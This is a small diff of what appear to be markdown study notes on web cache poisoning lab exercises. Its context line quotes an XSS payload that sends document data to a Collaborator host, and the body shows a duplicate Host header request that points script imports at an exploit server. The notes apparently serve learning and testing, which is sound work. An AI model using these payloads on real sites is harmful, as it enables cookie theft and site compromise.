@@ -676,7 +676,6 @@ GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+doc
 >Adding a second **Host** header with an exploit server, this ***identify*** a ambiguous cache vulnerability and routing your request. Notice that the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 
 
 ```html
-GET / HTTP/1.1
 Host: TARGET.net
 Host: exploit.net
 ```
